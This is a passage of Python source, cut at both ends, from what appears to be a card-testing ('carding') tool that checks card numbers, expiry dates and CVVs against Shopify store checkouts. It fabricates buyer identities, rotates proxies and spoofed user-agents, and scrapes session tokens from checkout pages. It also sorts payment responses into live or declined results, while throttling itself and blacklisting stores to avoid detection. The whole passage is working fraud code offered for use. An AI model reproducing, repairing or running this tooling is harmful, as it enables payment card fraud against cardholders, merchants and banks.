    return {"cc": cc_num, "month": mon, "year": yr, "cvv": cvv}

def _pick_address(url: str, currency: Optional[str] = None) -> dict:
    # v4.6.4 (Fix 8): handle multi-label ccTLDs before the TLD split.
    netloc = urlparse(url).netloc.split(":")[0].lower()
    known_slds = {
        "co.uk": "GB", "co.jp": "JP", "com.au": "AU",
        "co.nz": "NZ", "co.za": "ZA", "co.in": "IN",
    }
    for sld, cc in known_slds.items():
        if netloc.endswith("." + sld):
            return ADDRESS_BOOK.get(cc, ADDRESS_BOOK["DEFAULT"])
    tld = netloc.split(".")[-1].upper()
    if tld in ADDRESS_BOOK:
        return ADDRESS_BOOK[tld]
    if currency:
        cc = C2C.get(currency.upper())
        if cc and cc in ADDRESS_BOOK:
            return ADDRESS_BOOK[cc]
    return ADDRESS_BOOK["DEFAULT"]

def _random_identity() -> tuple[str, str, str]:
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    email = f"{first.lower()}.{last.lower()}{random.randint(1,9999)}@{random.choice(EMAIL_DOMAINS)}"
    return first, last, email

def _extract(text: str, start: str, end: str) -> Optional[str]:
    idx = text.find(start)
    if idx == -1:
        return None
    sub = text[idx + len(start):]
    end_idx = sub.find(end)
    if end_idx == -1:
        return None
    val = sub[:end_idx]
    return val if val else None

def _extract_sst(text: str, headers: dict) -> Optional[str]:
    for key in ("X-Checkout-One-Session-Token", "x-checkout-one-session-token"):
        if key in headers:
            return headers[key]
    patterns = [
        ('name="serialized-sessionToken" content="&quot;', "&quot;"),
        ('name="serialized-sessionToken" content="', '"'),
        ('"serializedSessionToken":"',   '"'),
        ('"sessionToken":"',             '"'),
        ("sessionToken&quot;:&quot;",   "&quot;"),
        ('data-session-token="',         '"'),
        ('"checkout_session_token":"',   '"'),
        ('"checkoutSessionToken":"',     '"'),
        ('checkoutSessionToken&quot;:&quot;', "&quot;"),
        ('data-checkout-session-token="', '"'),
        ('"session_token":"',            '"'),
        ('window.__CHECKOUT_SESSION_TOKEN__ = "', '"'),
        ('__checkout_session_token__":"', '"'),
    ]
    for s, e in patterns:
        val = _extract(text, s, e)
        if val and len(val) > 10:
            return val
    return None

def _ua_headers(ua: str) -> dict:
    major = re.search(r"Chrome/(\d+)", ua)
    chrome_ver = major.group(1) if major else "124"
    return {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "sec-ch-ua": f'"Chromium";v="{chrome_ver}", "Not_A.Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Upgrade-Insecure-Requests": "1",
    }

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESPONSE NORMALIZATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_EXACT_CODE_MAP = {
    "ORDER_PLACED":             "ORDER_PLACED",
    "PROCESSEDRECEIPT":         "ORDER_PLACED",
    "PAYMENT_COMPLETE":         "ORDER_PLACED",
    "AUTHENTICATION_REQUIRED":  "3DS_REQUIRED",
    "3DS_REQUIRED":             "3DS_REQUIRED",
    "OTP_REQUIRED":             "OTP_REQUIRED",
    "ACTION_REQUIRED":          "3DS_REQUIRED",
    "INVALID_CVC":              "INVALID_CVC",
    "INCORRECT_CVC":            "INVALID_CVC",
    "CVC_DECLINED":             "INVALID_CVC",
    "INSUFFICIENT_FUNDS":       "INSUFFICIENT_FUNDS",
    "EXPIRED_CARD":             "EXPIRED_CARD",
    "INVALID_CARD":             "INVALID_CARD",
    "INVALID_NUMBER":           "INVALID_CARD",
    "PAYMENT_METHOD_DECLINED":  "CARD_DECLINED",
    "DO_NOT_HONOR":             "CARD_DECLINED",
    "FRAUD_SUSPECTED":          "CARD_DECLINED",
    "AMOUNT_TOO_SMALL":         "INSUFFICIENT_FUNDS",
    "PICK_UP_CARD":             "CARD_DECLINED",
    "RESTRICTED_CARD":          "CARD_DECLINED",
    "STOLEN_CARD":              "CARD_DECLINED",
    "LOST_CARD":                "CARD_DECLINED",
    "TEST_MODE_LIVE_CARD":      "CARD_DECLINED",
    "PROCESSING_ERROR":         "CARD_DECLINED",
    "GENERIC_DECLINE":          "CARD_DECLINED",
    "INVALID_PURCHASE_TYPE":    "CARD_DECLINED",
    "INVALID_PAYMENT_METHOD":   "CARD_DECLINED",
    "THROTTLED":                "THROTTLED",
    "PROXY_ERROR":              "PROXY_ERROR",
    "TIMEOUT":                  "TIMEOUT",
    "CAPTCHA_REQUIRED":         "CAPTCHA_REQUIRED",
    "NO_PRODUCT":               "NO_PRODUCT",
    "NO_PRODUCT_FOUND":         "NO_PRODUCT_FOUND",
    "PRICE_TOO_HIGH":           "PRICE_TOO_HIGH",
    "SITE_REQUIRES_LOGIN":      "SITE_REQUIRES_LOGIN",
    "NO_SHOPIFY_PAYMENTS_GATEWAY": "NO_SHOPIFY_PAYMENTS_GATEWAY",
    "SITE_VALIDATED":           "SITE_VALIDATED",
    "DECISION_RULE_BLOCK":      "CARD_DECLINED",
}

def _normalize_response(raw: Optional[str]) -> str:
    if not raw:
        return "CARD_DECLINED"
    msg = str(raw).strip().upper()
    if msg in _EXACT_CODE_MAP:
        return _EXACT_CODE_MAP[msg]
    if any(k in msg for k in ("ORDER_PLACED", "PROCESSEDRECEIPT",
                              "PAYMENT_COMPLETE", "ORDER_CREATED")):
        return "ORDER_PLACED"
    if any(k in msg for k in ("ACTION_REQUIRED", "ACTIONREQUIRED", "3DS", "OTP",
                              "REDIRECT_TO_3DS", "COMPLETE_PAYMENT", "CHALLENGE",
                              "AUTHENTICATION_REQUIRED", "THREEDSSECURE",
                              "THREE_D_SECURE", "3D_SECURE", "SCA_REQUIRED")):
        return "3DS_REQUIRED"
    if any(k in msg for k in ("INVALID_CVC", "INVALID_SECURITY_CODE",
                              "CVC_FAILURE", "SECURITY_CODE", "CVV_FAILURE",
                              "INCORRECT_CVC", "CVC_CHECK_FAILED",
                              "CVV_CHECK_FAILED")):
        return "INVALID_CVC"
    if any(k in msg for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT",
                              "NOT_SUFFICIENT_FUNDS", "EXCEEDS_BALANCE",
                              "NOT_ENOUGH_BALANCE", "LOW_BALANCE")):
        return "INSUFFICIENT_FUNDS"
    if any(k in msg for k in ("EXPIRED", "EXPIRY", "INVALID_EXPIRY", "EXPIRATION")):
        return "EXPIRED_CARD"
    if any(k in msg for k in ("INVALID_NUMBER", "NO_SUCH_ISSUER", "INVALID_CARD",
                              "INCORRECT_NUMBER", "BAD_NUMBER", "INVALID_ACCOUNT",
                              "CARD_NOT_SUPPORTED")):
        return "INVALID_CARD"
    if any(k in msg for k in ("CAPTCHA", "RECAPTCHA", "HCAPTCHA",
                              "BOT_DETECTION", "CHALLENGE_REQUIRED")):
        return "CAPTCHA_REQUIRED"
    if any(k in msg for k in ("THROTTLED", "RATE_LIMIT", "TOO_MANY_REQUESTS")):
        return "THROTTLED"
    if any(k in msg for k in ("TIMEOUT", "TIMED_OUT")):
        return "TIMEOUT"
    if any(k in msg for k in ("DO_NOT_HONOR", "DO NOT HONOR",
                              "GENERIC_DECLINE", "TRANSACTION_NOT_ALLOWED",
                              "NOT_PERMITTED", "SERVICE_NOT_ALLOWED",
                              "TRY_AGAIN_LATER", "LIMIT_EXCEEDED")):
        return "CARD_DECLINED"
    return "CARD_DECLINED"

def _parse_gql_errors(errors: list) -> str:
    for err in errors:
        for field in ("code", "nonLocalizedMessage", "localizedMessage",
                      "message", "localizedMessageHtml", "messageUntranslated"):
            raw = str(err.get(field) or "").strip()
            if not raw:
                continue
            upper = raw.upper()
            # v4.6.4 (Fix 2): preserve explicit exact matches before the
            # CARD_DECLINED guard below — otherwise DECISION_RULE_BLOCK,
            # FRAUD_SUSPECTED, PAYMENT_METHOD_DECLINED, etc. fall through
            # to GRAPHQL_ERROR.
            if upper in _EXACT_CODE_MAP:
                return _EXACT_CODE_MAP[upper]
            norm = _normalize_response(raw)
            if norm != "CARD_DECLINED":
                return norm
            if any(k in upper for k in ("CAPTCHA", "RECAPTCHA", "HCAPTCHA", "BOT_DETECTION")):
                return "CAPTCHA_REQUIRED"
            if any(k in upper for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT")):
                return "INSUFFICIENT_FUNDS"
            if any(k in upper for k in ("INVALID_CVC", "CVC_FAILURE", "INCORRECT_CVC")):
                return "INVALID_CVC"
            if any(k in upper for k in ("PAYMENT_DECLINED", "CARD_DECLINED",
                                        "CHARGE_DECLINED", "FRAUD",
                                        "DO_NOT_HONOR", "DO NOT HONOR")):
                return "CARD_DECLINED"
            if any(k in upper for k in ("SESSION_EXPIRED", "SESSION_INVALID",
                                        "TOKEN_EXPIRED", "INVALID_SESSION")):
                return "SESSION_EXPIRED"
            if any(k in upper for k in ("LOGIN_REQUIRED", "ACCOUNT_REQUIRED",
                                        "CUSTOMER_DISABLED")):
                return "SITE_REQUIRES_LOGIN"
            if any(k in upper for k in ("OUT_OF_STOCK", "SOLD_OUT",
                                        "INVENTORY_CLAIM", "INVENTORY_RESERVATION")):
                return "NO_PRODUCT"
            if any(k in upper for k in ("THROTTLED", "RATE_LIMIT",
                                        "TOO_MANY_REQUESTS", "RETRY_LATER")):
                return "THROTTLED"
    return "GRAPHQL_ERROR"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SITE STATE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _is_blacklisted(hostname: str) -> bool:
    if _shared and _shared.enabled and _shared.is_blacklisted(hostname):
        return True
    s = _site_stats.get(hostname)
    if not s:
        return False
    return time.time() < s.get("blacklisted_until", 0)

def _is_throttled(hostname: str) -> bool:
    if _shared and _shared.enabled and _shared.is_throttled(hostname):
        return True
    return time.time() < _site_throttle.get(hostname, 0)

def _host_cooldown_active(hostname: str) -> bool:
    if _shared and _shared.enabled and _shared.is_host_cooling(hostname):
        return True
    return time.time() < _HOST_COOLDOWN.get(hostname, 0)

def _is_hard_dead(hostname: str) -> bool:
    if _shared and _shared.enabled and _shared.is_hard_dead(hostname):
        return True
    entry = _HARD_DEAD_CACHE.get(hostname)
    return bool(entry and time.time() < entry[0])

def _site_usable(hostname: str) -> tuple[bool, str]:
    if _is_hard_dead(hostname):
        entry = _HARD_DEAD_CACHE.get(hostname)
        orig_code = entry[1] if entry else "NO_PRODUCT"
        return False, f"{orig_code}: hard-dead cached"
    if _is_blacklisted(hostname):
        return False, "SITE_ERROR: blacklisted"
    if _is_throttled(hostname):
        return False, "THROTTLED"
    if _host_cooldown_active(hostname):
        # v4.6.4 (Fix 3): distinct code so the route layer does NOT
        # escalate a 30s host cooldown into a 300s site throttle.
        return False, "SELF_THROTTLED"
    return True, ""

def _mark_hard_dead(hostname: str, code: str) -> None:
    if not hostname or not code:
        return
    existing = _HARD_DEAD_CACHE.get(hostname)
    if existing and existing[0] > time.time():
        return
    if code in _HARD_DEAD_PERMANENT_CODES:
        ttl = _HARD_DEAD_TTL_PERMANENT
    elif code in _HARD_DEAD_PROBABLE_CODES:
        ttl = _HARD_DEAD_TTL_PROBABLE
    else:
        return
    exp = time.time() + ttl
    _HARD_DEAD_CACHE[hostname] = (exp, code)
    if _shared and _shared.enabled:
        _shared.mark_hard_dead(hostname, exp)
    log.info("[API] hard-dead cached: %s (%s) for %ds", hostname, code, ttl)

def _host_rate_allowed(hostname: str) -> bool:
    now = time.time()
    if now < _HOST_COOLDOWN.get(hostname, 0):
        return False
    hits = _HOST_HITS[hostname]
    while hits and hits[0] < now - _HOST_RATE_WINDOW:
        hits.popleft()
    if len(hits) >= _HOST_RATE_LIMIT:
        exp = now + _HOST_COOLDOWN_SEC
        _HOST_COOLDOWN[hostname] = exp
        if _shared and _shared.enabled:
            _shared.mark_host_cooling(hostname, exp)
        log.warning("[API] self-throttled %s (%d hits in %ds) for %ds",
                    hostname, len(hits), _HOST_RATE_WINDOW, _HOST_COOLDOWN_SEC)
        return False
    hits.append(now)
    return True

def _record_site_result(hostname: str, response_code: str) -> None:
    if not hostname:
        return
    # v4.6.3 (Fix 12): tolerate callers that pass a suffixed code.
    response_code = (
        str(response_code).upper().split(" - ")[0].split(":")[0].strip()
    )
    s = _site_stats[hostname]
    s["last_response"] = response_code
    if response_code == "THROTTLED":
        exp = time.time() + THROTTLE_COOLDOWN
        _site_throttle[hostname] = exp
        if _shared and _shared.enabled:
            _shared.mark_throttled(hostname, exp)
        return
    if response_code in PROXY_STOP_CODES or response_code in TRANSIENT_CODES:
        return
    # v4.6.4 (Fix 4): client-supplied bad variant IDs must not count as a
    # blacklist outcome — otherwise they dilute real site-error signals.
    if response_code == "VARIANT_NOT_FOUND":
        return
    is_err = response_code in SITE_ERROR_CODES
    s["outcomes"].append(1 if is_err else 0)
    if (len(s["outcomes"]) >= BLACKLIST_SAMPLES and
            sum(s["outcomes"]) / len(s["outcomes"]) >= BLACKLIST_THRESHOLD):
        exp = time.time() + BLACKLIST_SECONDS
        s["blacklisted_until"] = exp
        if _shared and _shared.enabled:
            _shared.mark_blacklisted(hostname, exp)
        log.warning("[API] blacklisted for %ds: %s (%d/%d errors)",
                    BLACKLIST_SECONDS, hostname,
                    sum(s["outcomes"]), len(s["outcomes"]))

def _preferred_variant(candidates: list[dict], max_price: float) -> Optional[dict]:
    if not candidates:
        return None
    def _pf(c):
        try:
            return float(c.get("price", "1e9"))
        except (ValueError, TypeError):
            return 1e9
    within = [c for c in candidates if _pf(c) <= max_price]
    above_min = [c for c in within if _pf(c) >= MIN_AMOUNT]
    if above_min:
        return min(above_min, key=_pf)
    if within:
        return min(within, key=_pf)
    return min(candidates, key=_pf)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PRODUCT FETCH
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def _fetch_products(
    base_url: str,
    proxy_str: Optional[str] = None,
    max_price: float = MAX_PRICE,
    session: Optional[AsyncSession] = None,
) -> tuple[Optional[dict], list[dict], Optional[str]]:
    if not base_url.startswith("http"):
        base_url = "https://" + base_url
    hostname = urlparse(base_url).netloc

    cached = _cache_get(hostname)
    if cached:
        return cached.get("product"), cached.get("candidates", []), cached.get("err")

    async with _host_locks[hostname]:
        cached = _cache_get(hostname)
        if cached:
            return cached.get("product"), cached.get("candidates", []), cached.get("err")

        own_session = session is None
        if own_session:
            session = _make_session(proxy_str)
        try:
            all_products: list = []
            fetch_error: Optional[str] = None
            try:
                resp = await session.get(
                    f"{base_url}/products.json?limit=100",
                    allow_redirects=True,
                    headers=_ua_headers(random.choice(USER_AGENTS)),
                )
                if resp.status_code == 200:
                    data = orjson.loads(resp.content)
                    all_products = data.get("products", []) or []
                elif resp.status_code in (429, 430):
                    _cache_write_failure(hostname, "THROTTLED", ttl=THROTTLE_COOLDOWN)
                    _site_throttle[hostname] = time.time() + THROTTLE_COOLDOWN
                    return None, [], "THROTTLED"
                else:
                    # v4.6.3 (Fix 2): any other HTTP status is a transient
                    # transport/site failure, NOT "no products".
                    fetch_error = f"SITE_ERROR: HTTP {resp.status_code}"
                    log.debug("[API] products.json HTTP %d for %s",
                              resp.status_code, hostname)
            except Exception as ex:
                msg = str(ex)
                if _looks_like_proxy_error(msg):
                    fetch_error = "PROXY_ERROR"
                elif isinstance(ex, asyncio.TimeoutError) or "timeout" in msg.lower():
                    fetch_error = "Timeout"
                else:
                    fetch_error = f"SITE_ERROR: {type(ex).__name__}"
                log.debug("[API] products.json fetch failed for %s: %s",
                          hostname, msg[:100])

            if fetch_error and not all_products:
                return None, [], fetch_error

            candidates: list[dict] = []
            cheapest_any: Optional[dict] = None
            cheapest_any_price = float("inf")
            ENOUGH = 25

            for product in all_products:
                for variant in product.get("variants", []):
                    try:
                        if variant.get("available", True) is False:
                            continue
                        price = float(variant.get("price") or "0")
                    except (ValueError, TypeError):
                        continue
                    if price <= 0:
                        continue
                    entry = {
                        "site":       base_url,
                        "price":      f"{price:.2f}",
                        "price_f":    price,
                        "variant_id": str(variant["id"]),
                        "title":      product.get("title", "Product"),
                        "handle":     product.get("handle", ""),
                    }
                    if price < cheapest_any_price:
                        cheapest_any_price = price
                        cheapest_any = entry
                    # v4.6.3 (Fix 9): cache ALL candidates up to
                    # HARD_MAX_PRICE so a low-max_price caller cannot
                    # starve a later variant_id lookup out of the pool.
                    if price <= HARD_MAX_PRICE:
                        candidates.append(entry)
                # v4.6.4 (Fix 5): break against HARD_MAX_PRICE * 0.5 (the
                # cache budget), not max_price * 0.5, so the early-stop
                # heuristic matches the sizing assumption of Fix 9.
                if (len(candidates) >= ENOUGH
                        and cheapest_any_price <= HARD_MAX_PRICE * 0.5):
                    break

            if not candidates and cheapest_any is None:
                _cache_write_failure(hostname, "No products found", ttl=1800)
                return None, [], "No products found"

            if cheapest_any_price > HARD_MAX_PRICE:
                err = f"PRICE_TOO_HIGH: cheapest ${cheapest_any_price:.2f} > ${HARD_MAX_PRICE:.2f}"
                _cache_write_failure(hostname, err)
                return None, [], err

            if not candidates:
                candidates = [cheapest_any]

            best = _preferred_variant(candidates, max_price)
            _cache_write_success(hostname, best, candidates)
            return best, candidates, None

        except (asyncio.TimeoutError, RequestsError) as ex:
            if _looks_like_proxy_error(str(ex)):
                return None, [], "PROXY_ERROR"
            return None, [], "Timeout"
        except Exception as ex:
            if _looks_like_proxy_error(str(ex)):
                return None, [], "PROXY_ERROR"
            return None, [], str(ex)
        finally:
            if own_session:
                await _close_session(session)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CORE VALIDATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def validate_card(
    cc:         str,
    month:      str,
    year:       str,
    cvv:        str,
    site_url:   str,
    variant_id: Optional[str] = None,
    proxy_str:  Optional[str] = None,
    max_price:  Optional[float] = None,
    validate_only: bool = False,
) -> dict:
    t0 = time.time()
    gateway = "UNKNOWN"
    price = "0.00"
    currency = "USD"
    product_title = ""
    effective_max_price = max_price if max_price is not None else MAX_PRICE

    site_url = site_url.strip()
    ourl = site_url if site_url.startswith("http") else f"https://{site_url}"
    hostname = urlparse(ourl).netloc
    ua = random.choice(USER_AGENTS)

    def _r(response: str, charged: str = "False", approved: str = "False",
           message: Optional[str] = None,
           is_site_error: Optional[bool] = None,
           proxy_dead: bool = False,
           hard_dead_code: Optional[str] = None) -> dict:
        code_upper = response.upper().split(" - ")[0].split(":")[0].strip()
        if code_upper in _HARD_DEAD_AUTO_MARK:
            _mark_hard_dead(hostname, code_upper)
        elif hard_dead_code:
            _mark_hard_dead(hostname, hard_dead_code)
        if proxy_dead:
            _mark_proxy_dead(proxy_str, message or "proxy error")
        elif code_upper in FINAL_CODES or code_upper == "SITE_VALIDATED":
            _mark_proxy_alive(proxy_str)

        if is_site_error is None:
            is_site_error = code_upper not in KNOWN_CARD_RESPONSES
        final_gateway = gateway if gateway and gateway != "UNKNOWN" else "Shopify Payments"
        # v4.6.3 (Fix 3): emit normalized code, full text only in Message.
        return {
            "Response":     code_upper or "CARD_DECLINED",
            "Message":      message or response,
            "code":         code_upper or "CARD_DECLINED",
            "decline_code": code_upper or "CARD_DECLINED",
            "Gateway":      final_gateway,
            "Price":        price,
            "Proxy":        "Dead" if proxy_dead else "Live",
            "ProxyUsed":    _mask_proxy(proxy_str) if proxy_str else "direct",
            "Status":       (not is_site_error),
            "Gate":         final_gateway,
            "CC":           f"{cc}|{month}|{year}|{cvv}",
            "Product":      product_title,
            "Site":         ourl,
            "Charged":      charged,
            "Approved":     approved,
            "Time":         f"{round(time.time() - t0, 2)}s",
            "Retry":        is_site_error,
            "SkipSite":     code_upper in SKIP_SITE_CODES,
        }

    proxy_ok, proxy_reason = _proxy_usable(proxy_str)
    if not proxy_ok:
        return _r("PROXY_ERROR",
                  message=f"Proxy in cooldown: {proxy_reason}",
                  proxy_dead=True, is_site_error=True)

    usable, reason = _site_usable(hostname)
    if not usable:
        code = reason.split(":")[0].strip() if ":" in reason else reason
        return _r(code, message=reason, is_site_error=True)

    if not _host_rate_allowed(hostname):
        # v4.6.4 (Fix 3): SELF_THROTTLED so _record_site_result does not
        # escalate the 30s host cooldown to a 300s site throttle.
        return _r("SELF_THROTTLED",
                  message="Self-throttled (rate limit)",
                  is_site_error=True)

    sem = _site_semaphores[hostname]

    async with sem:
        # v4.6.4 (Fix 10): bump last-seen only once we are actually going
        # to process the request, not on early proxy/site rejections.
        _HOST_LAST_SEEN[hostname] = t0
        session = _make_session(proxy_str)
        try:
            # v4.6.3 (Fix 13): removed the dead first _pick_address(ourl)
            # call — addr is assigned below, after currency is parsed.
            first, last, email = _random_identity()

            cached_v = _variant_cache.get(hostname)
            if (not variant_id and cached_v
                    and (time.time() - cached_v["ts"]) < VARIANT_TTL):
                variant_id = cached_v["variant"]["variant_id"]
                price = cached_v["variant"]["price"]
                product_title = cached_v["variant"].get("title", "")
                all_candidates = [cached_v["variant"]]
            else:
                best, all_candidates, err = await _fetch_products(
                    ourl, proxy_str, max_price=effective_max_price, session=session,
                )
                if not all_candidates and not best:
                    err_str = err or "No products available"
                    if err_str == "THROTTLED":
                        return _r("THROTTLED", message="Products endpoint rate-limited",
                                  is_site_error=True)
                    if err_str == "PROXY_ERROR":
                        return _r("PROXY_ERROR",
                                  message="Proxy/network failure during product fetch",
                                  proxy_dead=True, is_site_error=True)
                    if err_str.startswith("PRICE_TOO_HIGH"):
                        return _r("PRICE_TOO_HIGH", message=err_str, is_site_error=True)
                    if err_str == "No products found":
                        return _r("NO_PRODUCT", message=err_str,
                                  is_site_error=True,
                                  hard_dead_code="NO_PRODUCT")
                    if err_str == "Timeout":
                        return _r("TIMEOUT", message=err_str, is_site_error=True)
                    # Fix 2 fallout: HTTP 5xx / non-proxy transport errors
                    # land here as "SITE_ERROR: ..." (transient).
                    return _r("SITE_ERROR", message=err_str[:120], is_site_error=True)

                pick_pool = list(all_candidates) if all_candidates else ([best] if best else [])
                if not pick_pool:
                    return _r("SITE_ERROR", message=err or "No products",
                              is_site_error=True)

                if not variant_id:
                    chosen = _preferred_variant(pick_pool, effective_max_price)
                    variant_id = chosen["variant_id"]
                    price = chosen["price"]
                    product_title = chosen.get("title", "")
                    _variant_cache[hostname] = {
                        "variant": {
                            "variant_id": variant_id,
                            "price":      price,
                            "title":      product_title,
                            "price_f":    chosen.get("price_f"),
                            "site":       chosen.get("site"),
                            "handle":     chosen.get("handle", ""),
                        },
                        "ts": time.time(),
                    }
                else:
                    matched = next(
                        (c for c in pick_pool if str(c.get("variant_id")) == str(variant_id)),
                        None,
                    )
                    if not matched:
                        # v4.6.3 (Fix 1): client-supplied bad variant ID
                        # must NOT hard-dead the site. v4.6.4 (Fix 9):
                        # is_site_error=False so Status=True (site is fine).
                        return _r("VARIANT_NOT_FOUND",
                                  message=f"Variant {variant_id} not available on site",
                                  is_site_error=False)
                    price = matched["price"]
                    product_title = matched.get("title", "")

            base_headers = {
                "User-Agent": ua,
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Type": "application/json",
                "Origin": ourl,
                "Referer": f"{ourl}/",
                "sec-ch-ua": '"Chromium";v="124", "Not_A.Brand";v="24"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
            }

            cart_added = False
            for payload, ct in [
                (f"id={variant_id}&quantity=1", "application/x-www-form-urlencoded"),
                (orjson.dumps({"items": [{"id": int(variant_id), "quantity": 1}]}),
                 "application/json"),
            ]:
                try:
                    # v4.6.3 (M3): include browser navigation headers so
                    # Cloudflare-fronted stores do not 403 the POST.
                    r = await session.post(
                        f"{ourl}/cart/add.js",
                        data=payload,
                        headers={**_ua_headers(ua),
                                 "Content-Type": ct,
                                 "Accept": "application/json",
                                 "Origin": ourl,
                                 "Referer": f"{ourl}/"},
                    )
                    if r.status_code == 200:
                        cart_added = True
                        break
                except Exception:
                    continue

            if not cart_added:
                try:
                    r = await session.get(f"{ourl}/checkout",
                                          allow_redirects=True,
                                          headers=_ua_headers(ua))
                    if r.status_code == 200 and "checkouts/cn/" in str(r.url):
                        cart_added = True
                        cr = r
                        checkout_url = str(r.url)
                        page_text = r.text
                    else:
                        return _r("CART_FAILED", message="Could not add to cart",
                                  is_site_error=True)
                except Exception as ex:
                    if _looks_like_proxy_error(str(ex)):
                        return _r("PROXY_ERROR", message=str(ex)[:120],
                                  proxy_dead=True, is_site_error=True)
                    return _r("CART_FAILED", message="Could not add to cart",
                              is_site_error=True)
            else:
                try:
                    cr = await session.post(
                        f"{ourl}/checkout/",
                        allow_redirects=True,
                        headers={**base_headers,
                                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
                    )
                    checkout_url = str(cr.url)
                    page_text = cr.text
                except (asyncio.TimeoutError, RequestsError) as ex:
                    if _looks_like_proxy_error(str(ex)):
                        return _r("PROXY_ERROR", message=str(ex)[:120],
                                  proxy_dead=True, is_site_error=True)
                    return _r("TIMEOUT", message="Checkout timed out", is_site_error=True)
                except Exception as ex:
                    if _looks_like_proxy_error(str(ex)):
                        return _r("PROXY_ERROR", message=str(ex)[:120],
                                  proxy_dead=True, is_site_error=True)
                    return _r(f"CHECKOUT_FAILED: {type(ex).__name__}",
                              message=str(ex)[:100], is_site_error=True)

            lower_url = checkout_url.lower()
            if "login" in lower_url or "/account" in lower_url:
                return _r("SITE_REQUIRES_LOGIN", message="Store requires login",
                          is_site_error=True)

            early = page_text[:5000].lower()
            if ("enter password" in early or "storefront password" in early
                    or ('name="password"' in early and "login" in lower_url)):
                return _r("SITE_REQUIRES_LOGIN", message="Store is password-protected",
                          is_site_error=True)

            # v4.6.3 (Fix 11): handle /checkouts/cn/<id> and /checkouts/<id>.
            m = re.search(r"/checkouts/(?:cn/)?([^/?#]+)", checkout_url)
            attempt_token = (
                m.group(1) if m
                else checkout_url.rstrip("/").split("/")[-1].split("?")[0]
            )
            if not attempt_token or len(attempt_token) < 4:
                return _r("NO_ATTEMPT_TOKEN", message="No attempt token in URL",
                          is_site_error=True)

            sst = _extract_sst(page_text, dict(cr.headers))
            if not sst:
                early_lower = page_text[:5000].lower()
                if any(k in early_lower for k in (
                    "<title>just a moment...</title>",
                    "<title>attention required! | cloudflare</title>",
                    ">verify you are human<",
                    ">please verify you are a human<",
                )):
                    return _r("CAPTCHA_REQUIRED",
                              message="Cloudflare challenge at checkout",
                              is_site_error=True)
                return _r("NO_SESSION_TOKEN", message="No session token in HTML",
                          is_site_error=True)

            queue_token = (
                _extract(page_text, 'queueToken&quot;:&quot;', "&quot;") or
                _extract(page_text, '"queueToken":"', '"')
            )
            stable_id = (
                _extract(page_text, 'stableId&quot;:&quot;', "&quot;") or
                _extract(page_text, '"stableId":"', '"') or "1"
            )
            # v4.6.3 (Fix 5): do NOT fall back to variant_id.
            merch_gid = (
                _extract(page_text, "ProductVariantMerchandise/", "&quot;") or
                _extract(page_text, "ProductVariantMerchandise/", '&q') or
                _extract(page_text,
                         '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
            )
            if not merch_gid:
                return _r("NEGOTIATE_FAILED",
                          message="Could not extract merchandise GID from checkout page",
                          is_site_error=True)

            for s, e in [('currencyCode&quot;:&quot;', "&quot;"),
                         ('"currencyCode":"', '"')]:
                val = _extract(page_text, s, e)
                if val and len(val) == 3 and val.isalpha():
                    currency = val.upper()
                    break

            addr = _pick_address(ourl, currency)
            country_code = addr["countryCode"]
            phone  = addr["phone"]
            street = addr["address1"]
            city   = addr["city"]
            state  = addr["zoneCode"]
            s_zip  = addr["postalCode"]

            subtotal = (
                _extract(page_text,
                         'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;',
                         "&quot;") or
                _extract(page_text,
                         '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            )
            if not subtotal:
                m2 = re.search(r'"price":\s*"([\d.]+)"', page_text)
                candidate_sub = m2.group(1) if m2 else None
                if candidate_sub:
                    try:
                        v = float(candidate_sub)
                        if MIN_AMOUNT <= v <= HARD_MAX_PRICE * 10:
                            subtotal = candidate_sub
                    except ValueError:
                        pass
            # v4.6.3 (Fix 4): never submit a bogus 0.01 expectedTotalPrice.
            if not subtotal:
                return _r("SITE_ERROR",
                          message="Could not extract subtotal from checkout page",
                          is_site_error=True)

            unescaped = page_text.replace("&quot;", '"').replace("&amp;", "&")
            build_id = None
            m3 = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
            if m3:
                build_id = m3.group(1)

            source_token = _extract(
                page_text, 'name="serialized-sourceToken" content="', '"'
            )
            if source_token:
                source_token = source_token.replace("&quot;", "").strip('"')

            ident_sig = None
            m4 = re.search(
                r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"',
                unescaped,
            )
            if m4:
                ident_sig = m4.group(1)

            graphql_url = f"https://{hostname}/checkouts/unstable/graphql"

            gql_headers = {
                **base_headers,
                "shopify-checkout-client":  "checkout-web/1.0",
                "shopify-checkout-source":  f'id="{attempt_token}", type="cn"',
                "x-checkout-one-session-token": sst,
                "sec-fetch-dest": "empty",
